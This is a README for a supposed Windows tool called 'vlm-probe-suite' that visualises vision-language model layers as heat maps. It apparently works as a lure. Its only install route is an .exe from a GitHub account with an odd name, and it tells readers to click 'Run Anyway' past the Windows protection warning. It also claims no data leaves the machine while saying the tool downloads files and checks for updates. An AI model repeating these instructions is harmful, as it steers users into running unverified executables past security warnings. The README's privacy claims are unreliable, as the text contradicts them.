# 🔍 vlm-probe-suite - Explore vision language model internal layers

[![Download vlm-probe-suite](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Aileronisoleucine449/vlm-probe-suite)

This tool lets you test vision language models. It provides a simple way to look into how these models see images. You can use it to study models like CLIP, SigLIP, BLIP-2, and LLaVA. The software runs locally on your Windows computer.

## ⚙️ System Requirements

Before you start, make sure your computer meets these needs:

* Windows 10 or Windows 11.
* At least 16 GB of RAM.
* A graphics card with at least 8 GB of video memory.
* An updated graphics driver from your manufacturer.
* At least 5 GB of free space on your hard drive.

## 📥 How to Download

Visit the link below to get the software. Click the button to reach the release page.

[![Download Button](https://img.shields.io/badge/Download-Latest_Version-grey)](https://github.com/Aileronisoleucine449/vlm-probe-suite)

1. Go to the project page on GitHub.
2. Look for the section marked Releases on the right side of your screen.
3. Select the version at the top of the list.
4. Click the file ending in .exe to start the download.
5. Save the file to your desktop or downloads folder.

## 🛠️ Setting Up the Software

Follow these steps to run the application on your computer:

1. Locate the downloaded file in your folder.
2. Double-click the file to open the installer.
3. Follow the prompts on your screen.
4. The installer creates a shortcut on your desktop.
5. Click the shortcut to launch the probe suite.

If Windows shows a protection message, click More Info, then click Run Anyway. This confirms you trust the source of the application.

## 🚀 Running Your First Probe

Once the application opens, follow this process to start your work:

1. Select a model from the list in the drop-down menu. You can choose from CLIP, SigLIP, BLIP-2, or LLaVA.
2. Click the Load Model button. Wait for the green indicator to appear. This means the model is ready to use in your memory.
3. Upload an image file from your computer using the Upload button. Supported formats are JPG and PNG.
4. Choose the specific layer you want to probe. The software displays a list of numbered layers for the selected model.
5. Press the Start Probe button.
6. View the results in the main panel. The output shows how the model represents the image.

## 📊 Understanding the Output

The tool generates a heat map of your image. A heat map shows which parts of the image get the most attention from the model. Brighter colors mean the model focuses more on that area. Use the slider tool to adjust the detail of the map. Turning up the slider makes the map sharper.

You can save your results as a CSV file or an image. Click the Export button to choose your file format and destination folder.

## 🔧 Troubleshooting Common Issues

If the software fails to start, check the following items:

* Restart your computer. This clears stuck processes from your memory.
* Check your graphics card drivers. Go to the Device Manager in Windows and select the Display Adapters category. Right-click your card and select Update Driver.
* Review your free disk space. If the drive is full, the model cannot load successfully.
* Verify your internet connection. The first time you run a model, the software downloads small configuration files from the internet.

## 📝 Frequently Asked Questions

What happens to my data?
The software runs entirely on your machine. Your images stay on your computer. No data travels to a server or cloud service.

Can I probe multiple models at once?
The current version supports one model at a time to keep your computer stable.

How do I update the software?
The software checks for updates when you start it. If an update exists, it prompts you to download the new version.

## 💡 Best Practices

* Close other programs like web browsers during use to save memory. 
* Use high-resolution images for the best detail in your probes. 
* Keep your graphics drivers current to ensure the best performance.
* If the application feels slow, try a smaller model like CLIP rather than larger models like LLaVA. 
* Label your output files with clear names when you save them to keep your work organized. 
* Ensure your monitor settings are set to the recommended resolution for Windows to see the full interface clearly.
* Contact the developer through the GitHub issues page if you find a bug. Provide a clear description and a screenshot of the error message for faster support.